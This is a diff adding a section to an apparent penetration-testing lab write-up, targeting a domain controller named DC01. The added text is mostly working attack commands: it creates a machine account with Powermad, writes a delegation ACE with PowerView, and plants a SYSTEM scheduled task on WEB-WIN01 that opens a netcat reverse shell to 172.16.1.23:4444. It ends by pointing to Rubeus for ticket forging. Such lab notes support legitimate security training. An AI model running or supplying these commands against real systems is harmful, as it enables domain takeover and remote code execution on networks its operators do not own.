@@ -239,3 +239,54 @@ now login with remmina
 
 ## DC01
 
+<figure><img src="../.gitbook/assets/immagine (45).png" alt=""><figcaption></figcaption></figure>
+
+Import Powermad.ps1 and then
+
+{% code overflow="wrap" %}
+```
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+```
+{% endcode %}
+
+Import Powerview and then
+
+{% code overflow="wrap" %}
+```
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+```
+{% endcode %}
+
+We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
+
+{% code overflow="wrap" %}
+```
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+```
+{% endcode %}
+
+Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+
+{% code overflow="wrap" %}
+```
+Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+{% endcode %}
+
+
+
+{% code overflow="wrap" %}
+```powershell
+schtasks /create /S WEB-WIN01 /SC Weekly /RU "NT Authority\SYSTEM" /TN "hacker" /TR "powershell.exe -c 'C:\Users\cyber_adm\nc64.exe 172.16.1.23 4444 -e powershell.exe'"
+```
+{% endcode %}
+
+and launch it with a listener open
+
+```powershell
+schtasks /Run /S web-win01.corp.local /TN "hacker"
+```
+
+Now use rubeus to forge the tickets and get a shell on share
